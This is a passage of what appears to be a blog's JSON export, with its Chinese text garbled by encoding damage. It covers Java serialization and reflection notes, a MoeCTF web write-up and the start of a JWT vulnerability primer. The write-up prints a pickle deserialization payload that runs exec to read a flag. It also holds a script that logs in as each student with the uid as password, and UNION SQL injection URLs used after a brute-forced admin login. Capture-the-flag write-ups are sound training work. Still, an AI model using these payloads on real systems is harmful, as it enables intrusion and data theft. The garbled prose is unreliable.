æ³•æ­£ç¡®ååºåˆ—åŒ–ï¼›ä¸æŒ‡å®šç‰ˆæœ¬å·å¦ä¸€ä¸ªæ˜æ˜¾éšæ‚£æ˜¯ï¼Œä¸åˆ©äºjvmé—´çš„ç§»æ¤ï¼Œå¯èƒ½classæ–‡ä»¶æ²¡æœ‰æ›´æ”¹ï¼Œä½†ä¸åŒjvmå¯èƒ½è®¡ç®—çš„è§„åˆ™ä¸ä¸€æ ·ï¼Œè¿™æ ·ä¹Ÿä¼šå¯¼è‡´æ— æ³•ååºåˆ—åŒ–ã€‚ ä»€ä¹ˆæƒ…å†µä¸‹éœ€è¦ä¿®æ”¹serialVersionUIDå‘¢ï¼Ÿåˆ†ä¸‰ç§æƒ…å†µã€‚ å¦‚æœåªæ˜¯ä¿®æ”¹äº†æ–¹æ³•ï¼Œååºåˆ—åŒ–ä¸å®¹å½±å“ï¼Œåˆ™æ— éœ€ä¿®æ”¹ç‰ˆæœ¬å·ï¼› å¦‚æœåªæ˜¯ä¿®æ”¹äº†é™æ€å˜é‡ï¼Œç¬æ€å˜é‡ï¼ˆtransientä¿®é¥°çš„å˜é‡ï¼‰ï¼Œååºåˆ—åŒ–ä¸å—å½±å“ï¼Œæ— éœ€ä¿®æ”¹ç‰ˆæœ¬å·ï¼› å¦‚æœä¿®æ”¹äº†éç¬æ€å˜é‡ï¼Œåˆ™å¯èƒ½å¯¼è‡´ååºåˆ—åŒ–å¤±è´¥ã€‚å¦‚æœæ–°ç±»ä¸­å®ä¾‹å˜é‡çš„ç±»å‹ä¸åºåˆ—åŒ–æ—¶ç±»çš„ç±»å‹ä¸ä¸€è‡´ï¼Œåˆ™ä¼šååºåˆ—åŒ–å¤±è´¥ï¼Œè¿™æ—¶å€™éœ€è¦æ›´æ”¹serialVersionUIDã€‚å¦‚æœåªæ˜¯æ–°å¢äº†å®ä¾‹å˜é‡ï¼Œåˆ™ååºåˆ—åŒ–å›æ¥æ–°å¢çš„æ˜¯é»˜è®¤å€¼ï¼›å¦‚æœå‡å°‘äº†å®ä¾‹å˜é‡ï¼Œååºåˆ—åŒ–æ—¶ä¼šå¿½ç•¥æ‰å‡å°‘çš„å®ä¾‹å˜é‡ åå°„åŸºæœ¬ä½¿ç”¨äº†è§£åå°„ä¹‹å‰æˆ‘ä»¬å…ˆæ¥äº†è§£ä¸€ä¸‹ä»€ä¹ˆæ˜¯æ­£å°„ ä¸€èˆ¬æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬ä½¿ç”¨æŸä¸ªç±»çš„æ—¶å€™å¿…ç„¶çŸ¥é“å®ƒæ˜¯ä»€ä¹ˆç±»ï¼Œç”¨æ¥å¹²ä»€ä¹ˆçš„ï¼Œäºæ˜¯æˆ‘ä»¬å°±å¯ä»¥ç›´æ¥å¯¹å®ƒè¿›è¡Œå®ä¾‹åŒ–ï¼Œç„¶åä½¿ç”¨å…¶å¯¹è±¡æ“ä½œ Apple apple = new Apple(); //ç›´æ¥åˆå§‹åŒ–ï¼Œã€Œæ­£å°„ã€apple.setPrice(4); åƒä¸Šé¢è¿™æ ·çš„å°±å«åšæ­£å°„ é‚£ä¹ˆåå°„é¡¾åæ€ä¹‰å°±æ˜¯æˆ‘ä»¬å¹¶ä¸çŸ¥é“è¦åˆå§‹åŒ–çš„ç±»å¯¹è±¡æ˜¯ä»€ä¹ˆï¼Œä¹Ÿå°±æ— æ³•ä½¿ç”¨newæ¥åˆ›å»ºæ–°å¯¹è±¡ è¿™æ—¶å€™ï¼Œå°±è¦ç”¨JDKæä¾›çš„åå°„APIè¿›è¡Œåå°„è°ƒç”¨ï¼š Class clz = Class.forName(com.chenshuyi.reflect.Apple); //åŠ è½½è¯¥ç±»Method method = clz.getMethod(setPrice, int.class); //è·å–Appleç±»ä¸­çš„setPriceæ–¹æ³•ï¼Œè¯¥æ–¹æ³•çš„å‚æ•°æ˜¯intç±»å‹Constructor constructor = clz.getConstructor(); //è·å–æ— å‚æ„é€ æ–¹æ³•Object object = constructor.newInstance(); //åˆ›å»ºå®ä¾‹method.invoke(object, 4); //è°ƒç”¨æ–¹æ³• ä¸Šé¢ä¸¤æ®µä»£ç çš„æ‰§è¡Œç»“æœï¼Œå…¶å®æ˜¯å®Œå…¨ä¸€æ ·çš„ã€‚ä½†æ˜¯å…¶æ€è·¯å®Œå…¨ä¸ä¸€æ ·ï¼Œç¬¬ä¸€æ®µä»£ç åœ¨æœªè¿è¡Œæ—¶å°±å·²ç»ç¡®å®šäº†è¦è¿è¡Œçš„ç±»ï¼ˆAppleï¼‰ï¼Œè€Œç¬¬äºŒæ®µä»£ç åˆ™æ˜¯åœ¨è¿è¡Œæ—¶é€šè¿‡å­—ç¬¦ä¸²å€¼æ‰å¾—çŸ¥è¦è¿è¡Œçš„ç±»ï¼ˆcom.chenshuyi.reflect.Appleï¼‰ã€‚ æ‰€ä»¥è¯´ä»€ä¹ˆæ˜¯åå°„ï¼Ÿ åå°„å°±æ˜¯åœ¨è¿è¡Œæ—¶æ‰çŸ¥é“è¦æ“ä½œçš„ç±»æ˜¯ä»€ä¹ˆï¼Œå¹¶ä¸”å¯ä»¥åœ¨è¿è¡Œæ—¶è·å–ç±»çš„å®Œæ•´æ„é€ ï¼Œå¹¶è°ƒç”¨å¯¹åº”çš„æ–¹æ³• ï¼Œä¸€èˆ¬æƒ…å†µä¸‹æˆ‘ä»¬ä½¿ç”¨åå°„è·å–ä¸€ä¸ªå¯¹è±¡çš„æ­¥éª¤ï¼š è·å–ç±»çš„ Class å¯¹è±¡å®ä¾‹ Class clz = Class.forName(com.zhenai.api.Apple); æ ¹æ® Class å¯¹è±¡å®ä¾‹è·å– Constructor å¯¹è±¡ Constructor appleConstructor = clz.getConstructor(); ä½¿ç”¨ Constructor å¯¹è±¡çš„ newInstance æ–¹æ³•è·å–åå°„ç±»å¯¹è±¡ Object appleObj = appleConstructor.newInstance(); è€Œå¦‚æœè¦è°ƒç”¨æŸä¸€ä¸ªæ–¹æ³•ï¼Œåˆ™éœ€è¦ç»è¿‡ä¸‹é¢çš„æ­¥éª¤ï¼š è·å–æ–¹æ³•çš„ Method å¯¹è±¡ Method setPriceMethod = clz.getMethod(setPrice, int.class); åˆ©ç”¨ invoke æ–¹æ³•è°ƒç”¨æ–¹æ³• setPriceMethod.invoke(appleObj, 14); åå°„å¸¸ç”¨APIè·å–åå°„çš„Classå¯¹è±¡åœ¨ Java API ä¸­ï¼Œè·å– Class ç±»å¯¹è±¡æœ‰ä¸‰ç§æ–¹æ³•ï¼š ç¬¬ä¸€ç§ï¼Œä½¿ç”¨ Class.forName é™æ€æ–¹æ³•ã€‚å½“ä½ çŸ¥é“è¯¥ç±»çš„å…¨è·¯å¾„åæ—¶ï¼Œä½ å¯ä»¥ä½¿ç”¨è¯¥æ–¹æ³•è·å– Class ç±»å¯¹è±¡ã€‚ Class clz = Class.forName(java.lang.String); ç¬¬äºŒç§ï¼Œä½¿ç”¨ .class æ–¹æ³•ã€‚ è¿™ç§æ–¹æ³•åªé€‚åˆåœ¨ç¼–è¯‘å‰å°±çŸ¥é“æ“ä½œçš„ Classã€‚ Class clz = String.class; ç¬¬ä¸‰ç§ï¼Œä½¿ç”¨ç±»å¯¹è±¡çš„ getClass() æ–¹æ³•ã€‚ String str = new String(Hello);Class clz = str.getClass(); é€šè¿‡åå°„åˆ›å»ºç±»å¯¹è±¡é€šå¸¸æœ‰ä»¥ä¸‹ä¸¤ç§æ–¹æ³• ç¬¬ä¸€ç§ï¼šé€šè¿‡ Class å¯¹è±¡çš„ newInstance() æ–¹æ³•ã€‚ Class clz = Apple.class;Apple apple = (Apple)clz.newInstance(); ç¬¬äºŒç§ï¼šé€šè¿‡ Constructor å¯¹è±¡çš„ newInstance() æ–¹æ³• Class clz = Apple.class;Constructor constructor = clz.getConstructor();Apple apple = (Apple)constructor.newInstance(); é€šè¿‡ Constructor å¯¹è±¡åˆ›å»ºç±»å¯¹è±¡å¯ä»¥é€‰æ‹©ç‰¹å®šæ„é€ æ–¹æ³•ï¼Œè€Œé€šè¿‡ Class å¯¹è±¡åˆ™åªèƒ½ä½¿ç”¨é»˜è®¤çš„æ— å‚æ•°æ„é€ æ–¹æ³•ã€‚ä¸‹é¢çš„ä»£ç å°±è°ƒç”¨äº†ä¸€ä¸ªæœ‰å‚æ•°çš„æ„é€ æ–¹æ³•è¿›è¡Œäº†ç±»å¯¹è±¡çš„åˆå§‹åŒ–ã€‚ Class clz = Apple.class;Constructor constructor = clz.getConstructor(String.class, int.class);Apple apple = (Apple)constructor.newInstance(çº¢å¯Œå£«, 15); é€šè¿‡åå°„è·å–ç±»å±æ€§ã€æ–¹æ³•ã€æ„é€ å™¨æˆ‘ä»¬é€šè¿‡ Class å¯¹è±¡çš„ getFields() æ–¹æ³•å¯ä»¥è·å– Class ç±»çš„å±æ€§ï¼Œä½†æ— æ³•è·å–ç§æœ‰å±æ€§ã€‚ Class clz = Apple.class;Field[] fields = clz.getFields();for (Field field : fields) System.out.println(field.getName()); è¾“å‡ºç»“æœæ˜¯ï¼š price è€Œå¦‚æœä½¿ç”¨ Class å¯¹è±¡çš„ getDeclaredFields() æ–¹æ³•åˆ™å¯ä»¥è·å–åŒ…æ‹¬ç§æœ‰å±æ€§åœ¨å†…çš„æ‰€æœ‰å±æ€§ï¼š Class clz = Apple.class;Field[] fields = clz.getDeclaredFields();for (Field field : fields) System.out.println(field.getName()); è¾“å‡ºç»“æœæ˜¯ï¼š nameprice ä¸è·å–ç±»å±æ€§ä¸€æ ·ï¼Œå½“æˆ‘ä»¬å»è·å–ç±»æ–¹æ³•ã€ç±»æ„é€ å™¨æ—¶ï¼Œå¦‚æœè¦è·å–ç§æœ‰æ–¹æ³•æˆ–ç§æœ‰æ„é€ å™¨ï¼Œåˆ™å¿…é¡»ä½¿ç”¨æœ‰ declared å…³é”®å­—çš„æ–¹æ³•ã€‚","categories":["å¼€å‘"]},{"title":"MoeCTFå¤ç›˜","path":"/2024/10/15/MoeCTFå¤ç›˜/","content":"å‰è¨€æœ¬ç¯‡å¤ç›˜ä»…ä»…æ˜¯é’ˆå¯¹äºæœ¬æ¬¡æ¯”èµ›ä¸­æˆ‘ä¸ä¼šçš„é¢˜ç›®è¿›è¡Œä¸€æ¬¡å¤ç›˜ï¼Œå¯¹äºåšå‡ºæ¥çš„é¢˜ç›®å¹¶ä¸ä¼šå†™ä¸Šç›¸å…³çš„é¢˜è§£ å¹¶ä¸”ä»…ä»…æ˜¯webæ–¹å‘çš„é¢˜ç›® Re: ä»é›¶å¼€å§‹çš„ XDU æ•™ä¹¦ç”Ÿæ´»è¯¥é¢˜é¦–å…ˆè¦å¯¹é¢˜ç›®æä¾›çš„æºç ç†è§£é€å½»ï¼Œæ˜ç™½æ¯ä¸ªå‡½æ•°çš„åŠŸèƒ½ é¢˜ç›®è¦æ±‚æ˜¯è¦è®©æ¯ä¸ªå­¦ç”Ÿéƒ½æ­£å¸¸ç­¾åˆ°æ‰å¯ä»¥è·å¾—flag å…¶å®æœ¬è´¨ä¸Šå°±æ˜¯éœ€è¦æˆ‘ä»¬é‡å¤å‘é€è¯·æ±‚ è„šæœ¬å¦‚ä¸‹ï¼š import requestsfrom Crypto.Cipher import AESimport base64# è¯·æ›¿æ¢ä¸ºæ‚¨çš„é¶æœºBASE_URL = http://127.0.0.1:8888def encrypt_by_aes(data: str, key: str, iv: str) - str: key_bytes = key.encode(utf-8) iv_bytes = iv.encode(utf-8) cipher = AES.new(key_bytes, AES.MODE_CBC, iv_bytes) data_bytes = data.encode(utf-8) pad = 16 - len(data_bytes) % 16 data_bytes = data_bytes + bytes([pad] * pad) encrypted_bytes = cipher.encrypt(data_bytes) encrypted = base64.b64encode(encrypted_bytes).decode(utf-8) return encrypteddef login(phone: str, password: str): url = fBASE_URL/fanyalogin key = u2oh6Vu^HWe4_AES iv = u2oh6Vu^HWe4_AES encrypted_phone = encrypt_by_aes(phone, key, iv) encrypted_password = encrypt_by_aes(password, key, iv) data = uname: encrypted_phone, password: encrypted_password, t: true session = requests.Session() response = session.post(url, data=data) response_data = response.json() if response_data.get(status): return session else: print(Login failed:, response_data.get(msg2)) return Nonedef get_unsigned_student_accounts(session): url = fBASE_URL/widget/sign/pcTeaSignController/showSignInfo1 response = session.get(url) response_data = response.json() students = response_data[data][changeUnSignList] return studentsdef get_sign_code(session): url = fBASE_URL/v2/apis/sign/refreshQRCode response = session.get(url) response_data = response.json() if response_data.get(result) == 1: return response_data[data][signCode], response_data[data][enc] else: print(Failed to get sign code:, response_data.get(errorMsg)) return None, Nonedef sign_in(session, sign_code: str, enc: str): url = fBASE_URL/widget/sign/e params = id: str(active_id), c: sign_code, enc: enc response = session.get(url, params=params) return response.textdef end_active(session): url = fBASE_URL/widget/active/endActive response = session.get(url) response_data = response.json() if response_data.get(result) == 1: return response_data.get(errorMsg) else: print(Failed to end activity:, response_data.get(errorMsg)) return Noneif __name__ == __main__: teacher_phone = 10000 teacher_password = 10000 active_id = 4000000000000 teacher_session = login(teacher_phone, teacher_password) if teacher_session: students = get_unsigned_student_accounts(teacher_session) sign_code, enc = get_sign_code(teacher_session) for student in students: student_session = login(str(student[uid]), str(student[uid])) if student_session and sign_code and enc: sign_in_response = sign_in(student_session, sign_code, enc) print(fStudent student[uid] sign in response:, sign_in_response) flag = end_active(teacher_session) print(Flag:, flag) PetStoreæœ¬é¢˜çš„å…³é”®ä»£ç å¦‚ä¸‹ï¼š def import_pet(self, serialized_pet) - bool: try: pet_data = base64.b64decode(serialized_pet) pet = pickle.loads(pet_data) if isinstance(pet, Pet): for i in self.pets: if i.uuid == pet.uuid: return False self.pets.append(pet) return True return False except Exception: return False å¯ä»¥çœ‹å‡ºæ¥æ˜¯è°ƒç”¨äº†pickleçš„ååºåˆ—åŒ–ï¼Œæ‰€ä»¥æˆ‘ä»¬çš„æ€è·¯å°±æ˜¯ç”Ÿæˆä¸€ä¸ªæ¶æ„çš„ç±»å¯¹è±¡ï¼Œå¯¹å…¶ Pickle åºåˆ—åŒ–åè¿›è¡Œ Base64 ç¼–ç ï¼ŒæŠŠå¾—åˆ°çš„ç»“æœä¼ å…¥ import_pet() æ–¹æ³•å°±å¯ä»¥äº† ä¸Šç½‘æœç´¢ä¸‹è¯¥æ€ä¹ˆåˆ©ç”¨ï¼Œå‘ç°åªè¦è¢«åºåˆ—åŒ–çš„å¯¹è±¡ä¸­å­˜åœ¨__reduce__æ–¹æ³•ï¼Œpickle æ¨¡å—ä¼šè°ƒç”¨è¿™ä¸ªæ–¹æ³•æ¥è· å–å¯¹è±¡çš„åºåˆ—åŒ–ä¿¡æ¯ã€‚ __reduce__ æ–¹æ³•åº”è¿”å›ä¸€ä¸ªå…ƒç»„ï¼Œè¿™ä¸ªå…ƒç»„åŒ…å«ä¸¤ä¸ªå…ƒç´ ï¼š ä¸€ä¸ªå¯è°ƒç”¨å¯¹è±¡ï¼šé€šå¸¸æ˜¯ä¸€ä¸ªæ„é€ å™¨æˆ–ä¸€ä¸ªå‡½æ•°ã€‚è¿™ä¸ªå¯¹è±¡åœ¨ååºåˆ—åŒ–æ—¶è¢«è°ƒ ç”¨ï¼Œç”¨äºåˆ›å»ºæ–°çš„å¯¹è±¡å®ä¾‹ã€‚ ä¸€ä¸ªå…ƒç»„ï¼šåŒ…å«ä¼ é€’ç»™å¯è°ƒç”¨å¯¹è±¡çš„å‚æ•°ã€‚å½“ååºåˆ—åŒ–æ—¶ï¼Œè¿™ä¸ªå…ƒç»„ä¸­çš„å‚æ•°ä¼š ä¼ é€’ç»™ç¬¬ä¸€ä¸ªå…ƒç´ ï¼ˆå¯è°ƒç”¨å¯¹è±¡ï¼‰ã€‚ å½“ååºåˆ—åŒ–æ—¶ï¼Œpickle æ¨¡å—ä¼šæŒ‰ç…§ä»¥ä¸‹æ­¥éª¤æ“ä½œï¼š è°ƒç”¨ç¬¬ä¸€ä¸ªå…ƒç´ ï¼ˆå¯è°ƒç”¨å¯¹è±¡ï¼‰å¹¶ä¼ å…¥ç¬¬äºŒä¸ªå…ƒç´ ï¼ˆå…ƒç»„ï¼‰çš„è§£åŒ…ç»“æœä½œä¸ºå‚æ•°ã€‚ ä½¿ç”¨å¯è°ƒç”¨å¯¹è±¡çš„è¿”å›å€¼ä½œä¸ºååºåˆ—åŒ–çš„ç»“æœã€‚ __reduce__()å…¶å®æ˜¯objectç±»ä¸­çš„ä¸€ä¸ªé­”æœ¯æ–¹æ³•ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡é‡å†™ç±»çš„ object.__reduce__() å‡½æ•°ï¼Œä½¿ä¹‹åœ¨è¢«å®ä¾‹åŒ–æ—¶æŒ‰ç…§é‡å†™çš„æ–¹å¼è¿›è¡Œã€‚ Pythonè¦æ±‚è¯¥æ–¹æ³•è¿”å›ä¸€ä¸ªå­—ç¬¦ä¸²æˆ–è€…å…ƒç»„ã€‚å¦‚æœè¿”å›å…ƒç»„(callable, ([para1,para2...])[,...]) ï¼Œé‚£ä¹ˆæ¯å½“è¯¥ç±»çš„å¯¹è±¡è¢«ååºåˆ—åŒ–æ—¶ï¼Œè¯¥callableå°±ä¼šè¢«è°ƒç”¨ï¼Œå‚æ•°ä¸ºpara1ã€para2... ä» Dockerfile ä¸­å¯ä»¥çŸ¥é“ï¼Œé¢˜ç›®ç¯å¢ƒä¸­çš„ Python ç‰ˆæœ¬æ˜¯ 3.12.4ï¼Œä¸” flag å­˜å‚¨åœ¨ç¯å¢ƒå˜é‡ FLAG ä¸­ æˆ‘æœ¬äººæ˜¯é€šè¿‡å»ºä¸€ä¸ªdockerå®¹å™¨æ¥å®ç°åºåˆ—åŒ–è¿‡ç¨‹çš„ï¼ˆä¸æ˜¯å¾ˆæƒ³å†é…ç¯å¢ƒï¼Œæ¯”è¾ƒéº»çƒ¦ï¼‰ åºåˆ—åŒ–çš„pythonä»£ç å¦‚ä¸‹ï¼š import base64import pickleclass Test: def __reduce__(self): return (exec, (import os; store.create_pet(os.getenv(FLAG), flag);,))if __name__ == __main__: print(base64.b64encode(pickle.dumps(Test())).decode(utf-8)) å°†åºåˆ—åŒ–åçš„å†…å®¹è¾“å…¥Import a Petä¸­ï¼Œä¾¿å¯ä»¥åœ¨ä¸»é¡µé¢çœ‹åˆ°flagçš„å†…å®¹äº† åºåˆ—åŒ–åçš„å†…å®¹è¢«é¢˜ç›®ååºåˆ—åŒ–åæ‰§è¡Œçš„ä»£ç ä¸ºexec(import os; store.create_pet(flag, os.getenv(FLAG));) smbmsè¯¥é¢˜ä¸ºjavaä»£ç å®¡è®¡ ç”±äºæœ¬äººåˆšåˆšå­¦å®ŒjavaåŸºç¡€ï¼Œä»£ç å®¡è®¡èµ·æ¥è¿˜æ˜¯æ¯”è¾ƒå›°éš¾ åœ¨å®¡è®¡çš„è¿‡ç¨‹ä¸­å¯ä»¥å‘ç°æ•´ä¸ª java é¡¹ç›®éƒ½ä½¿ç”¨ PrepareStatement é¢„ç¼–è¯‘è¯­å¥ï¼Œæ‰€ä»¥ä¸€èˆ¬æƒ…å†µä¸‹æ˜¯ä¸èƒ½æ³¨å…¥çš„ ä½†æ˜¯æ–¹å¼éƒ½æœ‰ä¾‹å¤–ï¼Œé‚£äº›åŸºç¡€çš„sqlè¯­å¥è™½ç„¶å…¨éƒ¨éƒ½æ˜¯é¢„ç¼–è¯‘è¿‡äº†çš„ï¼Œä½†æ˜¯åé¢è¿˜æœ‰å¦å¤–å¢æ·»éƒ¨åˆ†æŸ¥è¯¢æ¡ä»¶çš„ å°±æ¯”å¦‚javatopsxrhhhdaouserUserDaoImpl.java æ–‡ä»¶ä¸­çš„getUserListå‡½æ•°ä¾¿å‡ºç°äº†å­—ç¬¦ä¸²æ‹¼æ¥çš„æƒ…å†µ if (!StringUtils.isNullOrEmpty(userName)) // æ·»åŠ ç”¨æˆ·åæŸ¥è¯¢æ¡ä»¶ sql.append( and u.userName like %).append(userName).append(%); å¯ä»¥å‘ç°userNameå‚æ•°æ˜¯ç›´æ¥æ’å…¥è¿›sqlè¯­å¥è¿›è¡Œæ¡ä»¶æ ¡æ­£çš„ï¼Œå•å¼•å·åŒ…æ‹¬ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥å°è¯•é€ƒå‡ºå•å¼•å·å†æ‹¼æ¥è‡ªå·±çš„sqlè¯­å¥ ä½†æ˜¯è¦æ‰§è¡Œè¿™ä¸ªå‡½æ•°ï¼ˆå³æŸ¥è¯¢ç”¨æˆ·ï¼‰ï¼Œæˆ‘ä»¬éœ€è¦å…ˆç™»å½•è¿›åå° æ‰€ä»¥è¿›è¡Œçˆ†ç ´ï¼Œè´¦å·åä¸ºadminï¼Œå¯†ç ä¸º1234567 è¿›å…¥åå°åˆ°æŸ¥è¯¢ç”¨æˆ·å¤„ï¼Œå¼€å§‹sqlæ³¨å…¥ï¼Œå…¶ä¸­çš„%25å°±æ˜¯%çš„urlç¼–ç  /jsp/user.do?method=queryqueryName=1%25union select 1,2,database(),4,5,6,7,8,9,1,1,1,1,1 where 1 like %251queryUserRole=0pageIndex=1 è¿™é‡Œæœ€å¥½æ˜¯ä½¿ç”¨ç›´æ¥é—­åˆçš„æ–¹å¼ï¼ˆæˆ‘ä¹‹å‰é‡‡ç”¨æ³¨é‡Šæ‰åé¢sqlè¯­å¥çš„æ–¹å¼å¹¶æ²¡æœ‰å¥æ•ˆï¼‰ æ¥ä¸‹æ¥éƒ½æ˜¯unionæ³¨å…¥çš„è¿‡ç¨‹ï¼Œä¾¿ä¸ä¸€ä¸€åˆ—ä¸¾äº† /jsp/user.do?method=queryqueryName=1%25 union select 1,1,group_concat(flag),4,5,6,7,8,9,1,1,1,1,1 from flag where 1like%251queryUserRole=0pageIndex=1 æ‹¿åˆ°flagï¼Œé¢˜ç›®è§£å†³","categories":["Write-Up"]},{"title":"JWTæ¼æ´å­¦ä¹ ","path":"/2024/10/08/JWTæ¼æ´å­¦ä¹ /","content":"å€Ÿé‰´JWTæ¸—é€å§¿åŠ¿ JWTï¼ˆJSON Web Tokenï¼‰æ˜¯ä¸€ç§æ— çŠ¶æ€è®¤è¯æœºåˆ¶ï¼Œé€šè¿‡å°†ç”¨æˆ·èº«ä»½å’Œæƒé™ä¿¡æ¯å­˜å‚¨åœ¨ä»¤ç‰Œä¸­ï¼Œå®ç°å®‰å…¨åœ°åœ¨ç½‘ç»œåº”ç”¨é—´ä¼ é€’ä¿¡æ¯ã€‚å®ƒå…·æœ‰è·¨åŸŸæ”¯æŒã€æ‰©å±•æ€§å’Œçµæ´»æ€§ã€å®‰å…¨æ€§ä»¥åŠå¯æ‰©å±•çš„éªŒè¯æ–¹å¼ç­‰ç‰¹ç‚¹ï¼Œæˆä¸ºç°ä»£åº”ç”¨å¼€å‘ä¸­é‡è¦çš„è®¤è¯å’Œæˆæƒè§£å†³æ–¹æ¡ˆã€‚ JWTçš„ç»„æˆJWTçš„ç»“æ„ç”±ä¸‰éƒ¨åˆ†ç»„æˆï¼Œåˆ†åˆ«æ˜¯Headerã€Payloadå’ŒSignatureï¼Œä¸‹é¢æ˜¯æ¯ä¸€éƒ¨åˆ†çš„è¯¦ç»†ä»‹ç»å’Œç¤ºä¾‹ï¼š Header éƒ¨åˆ†åœ¨ JWT ä¸­ Header éƒ¨åˆ†å­˜å‚¨çš„æ˜¯ Token ç±»å‹å’ŒåŠ å¯†ç®—æ³•ï¼Œé€šå¸¸ä½¿ç”¨JSONå¯¹è±¡è¡¨ç¤ºå¹¶ä½¿ç”¨Base64ç¼–ç ï¼Œå…¶ä¸­åŒ…å«ä¸¤ä¸ªå­—æ®µï¼šalgå’Œtyp alg(algorithm)ï¼šæŒ‡å®šäº†ä½¿ç”¨çš„åŠ å¯†ç®—æ³•ï¼Œå¸¸è§çš„æœ‰HMACã€RSAå’ŒECDSAç­‰ç®—æ³• typ(type)ï¼šæŒ‡å®šäº†JWTçš„ç±»å‹ï¼Œé€šå¸¸ä¸ºJWT ä¸‹é¢æ˜¯ä¸€ä¸ªç¤ºä¾‹Headerï¼š alg: HS256, typ: JWT Payload éƒ¨åˆ†PayloadåŒ…å«äº†JWTçš„ä¸»è¦ä¿¡æ¯ï¼Œé€šå¸¸ä½¿ç”¨JSONå¯¹è±¡è¡¨ç¤ºå¹¶ä½¿ç”¨Base64ç¼–ç ï¼ŒPayloadä¸­åŒ…å«ä¸‰ä¸ªç±»å‹çš„å­—æ®µï¼šæ³¨å†Œå£°æ˜ã€å…¬å…±å£°æ˜å’Œç§æœ‰å£°æ˜ å…¬å…±å£°æ˜ï¼šæ˜¯è‡ªå®šä¹‰çš„å­—æ®µï¼Œç”¨äºä¼ é€’éæ•æ„Ÿä¿¡æ¯ï¼Œä¾‹å¦‚:ç”¨æˆ·IDã€è§’è‰²ç­‰ ç§æœ‰å£°æ˜ï¼šæ˜¯è‡ªå®šä¹‰çš„å­—æ®µï¼Œç”¨äºä¼ é€’æ•æ„Ÿä¿¡æ¯ï¼Œä¾‹å¦‚å¯†ç ã€ä¿¡ç”¨å¡å·ç­‰ æ³¨å†Œå£°æ˜ï¼šé¢„å®šä¹‰çš„æ ‡å‡†å­—æ®µï¼ŒåŒ…å«äº†ä¸€äº›JWTçš„å…ƒæ•°æ®ä¿¡æ¯ï¼Œä¾‹å¦‚:å‘è¡Œè€…ã€è¿‡æœŸæ—¶é—´ç­‰ ä¸‹é¢æ˜¯ä¸€ä¸ªç¤ºä¾‹Payloadï¼š sub: 1234567890, name: John Doe, iat: 1516239022 å…¶ä¸­subè¡¨ç¤ºä¸»é¢˜ï¼Œnameè¡¨ç¤ºåç§°ï¼Œiatè¡¨ç¤ºJWTçš„ç­¾å‘æ—¶é—´ Signature éƒ¨åˆ†Signatureæ˜¯ä½¿ç”¨æŒ‡å®šç®—æ³•å¯¹Headerå’ŒPayloadè¿›è¡Œç­¾åç”Ÿæˆçš„ï¼Œç”¨äºéªŒè¯JWTçš„å®Œæ•´æ€§å’ŒçœŸå®æ€§ Signatureçš„ç”Ÿæˆæ–¹å¼é€šå¸¸æ˜¯å°†Headerå’ŒPayloadè¿æ¥èµ·æ¥ç„¶åä½¿ç”¨æŒ‡å®šç®—æ³•å¯¹å…¶è¿›è¡Œç­¾åï¼Œæœ€ç»ˆå°†ç­¾åç»“æœä¸Headerå’ŒPayloadä¸€èµ·ç»„æˆJWT Signatureçš„ç”Ÿæˆå’ŒéªŒè¯éœ€è¦ä½¿ç”¨ç›¸åŒçš„å¯†é’¥ ä¸‹é¢æ˜¯ä¸€ä¸ªç¤ºä¾‹Signature HMACSHA256(base64UrlEncode(header) + . +base64UrlEncode(payload),secret) å…¶ä¸­HMACSHA256æ˜¯ä½¿ç”¨HMAC SHA256ç®—æ³•è¿›è¡Œç­¾åï¼Œheaderå’Œpayloadæ˜¯ç»è¿‡Base64ç¼–ç çš„Headerå’ŒPayloadï¼Œsecretæ˜¯ç”¨äºç­¾åå’ŒéªŒè¯çš„å¯†é’¥ï¼Œæœ€ç»ˆå°†Headerã€Payloadå’ŒSignatureè¿æ¥èµ·æ¥ç”¨å¥ç‚¹(.)åˆ†éš”å°±å½¢æˆäº†ä¸€ä¸ªå®Œæ•´çš„JWT å®Œæ•´çš„JWTç¬¬ä¸€éƒ¨åˆ†æ˜¯Headerï¼Œç¬¬äºŒéƒ¨åˆ†æ˜¯Payloadï¼Œç¬¬ä¸‰éƒ¨åˆ†æ˜¯Signatureï¼Œå®ƒä»¬ä¹‹é—´ç”±ä¸‰ä¸ª . åˆ†éš”ï¼Œæ³¨æ„JWT ä¸­çš„æ¯ä¸€éƒ¨åˆ†éƒ½æ˜¯ç»è¿‡Base64ç¼–ç çš„ï¼Œä½†å¹¶ä¸æ˜¯åŠ å¯†çš„ï¼Œå› æ­¤JWTä¸­çš„ä¿¡æ¯æ˜¯å¯ä»¥è¢«è§£å¯†çš„ ä¸‹é¢æ˜¯ä¸€ä¸ªç¤ºä¾‹JWT eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c JWTåè¯ JWSï¼ˆSigned JWTï¼‰ï¼šJWSæ˜¯æŒ‡å·²ç­¾åçš„JWTã€‚å®ƒç”±JWTçš„Headerã€Payloadå’ŒSignatureç»„æˆï¼Œå…¶ä¸­Signatureæ˜¯ä½¿ç”¨å¯†é’¥å¯¹Headerå’ŒPayloadè¿›è¡Œæ•°å­—ç­¾åå¾—åˆ°çš„ã€‚é€šè¿‡éªŒè¯ç­¾åï¼Œå¯ä»¥ç¡®ä¿JWTçš„å®Œæ•´æ€§å’ŒçœŸå®æ€§ã€‚ JWKï¼ˆJSON Web Keyï¼‰ï¼šJWKæ˜¯æŒ‡ç”¨äºJWTçš„å¯†é’¥ã€‚å®ƒå¯ä»¥æ˜¯å¯¹ç§°åŠ å¯†å¯†é’¥ï¼ˆä¾‹å¦‚å¯†ç ï¼‰ï¼Œä¹Ÿå¯ä»¥æ˜¯éå¯¹ç§°åŠ å¯†å¯†é’¥ï¼ˆä¾‹å¦‚å…¬é’¥ç§é’¥å¯¹ï¼‰ã€‚JWKç”¨äºç”Ÿæˆå’ŒéªŒè¯JWTçš„ç­¾åï¼Œç¡®ä¿åªæœ‰æ‹¥æœ‰æ­£ç¡®å¯†é’¥çš„ä¸€æ–¹èƒ½å¤Ÿå¯¹JWTè¿›è¡Œæ“ä½œã€‚ JWEï¼ˆEncrypted JWTï¼‰ï¼šJWEæ˜¯æŒ‡ç»è¿‡åŠ 